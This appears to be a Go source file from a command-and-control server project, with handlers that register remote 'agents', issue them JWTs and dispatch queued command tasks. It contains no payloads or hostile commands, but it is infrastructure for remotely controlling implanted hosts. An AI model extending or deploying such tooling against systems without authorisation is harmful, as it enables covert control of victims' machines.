package server

import (
	"bytes"
	"fmt"

	bytehandler "github.com/execute-assembly/c2-proj/newserver/internal/bytes"
	"github.com/execute-assembly/c2-proj/newserver/internal/database"
	"github.com/execute-assembly/c2-proj/newserver/internal/rpc"
)

func NewClientRegisterHandler(Ip string, reader *bytes.Reader) ([]byte, error) {
	ClientGuid, CodeName, err := database.RegisterClient(reader, Ip)
	if err != nil {
		return nil, err
	}

	JwtToken, err := CreateJWT(ClientGuid)
	if err != nil {
		return nil, err
	}

	JwtBytes, err := bytehandler.CraftJwtResponse(JwtToken)
	if err != nil {
		return nil, err
	}

	rpc.BroadcastEvent("new_agent", CodeName, fmt.Sprintf("\n[*]New agent connected: %s", CodeName))

	return JwtBytes, nil
}

func GetTaskHandler(token string) ([]byte, error) {
	AgentGuid, err := VerifyToken(token)
	if err != nil {
		return nil, err
	}

	err = database.UpdateLastSeen_db(AgentGuid)
	if err != nil {
		return nil, err
	}

	rpc.CommandMu.RLock()
	Tasks := rpc.CommandMap[AgentGuid]
	if len(Tasks) > 3 {
		Tasks = Tasks[:3]
	}
	rpc.CommandMu.RUnlock()

	var taskData []bytehandler.TaskData
	for _, t := range Tasks {
		taskData = append(taskData, bytehandler.TaskData{
			TaskID:      t.TaskID,
			CommandCode: t.CommandCode,
			Param1:      t.Param1,
			Param2:      t.Param2,
		})
	}
	respBytes, err := bytehandler.CraftTaskResponse(taskData)
	if err != nil {
		return nil, err
	}

	rpc.CommandMu.Lock()
	rpc.CommandMap[AgentGuid] = rpc.CommandMap[AgentGuid][len(Tasks):]
	rpc.CommandMu.Unlock()

	return respBytes, nil
}
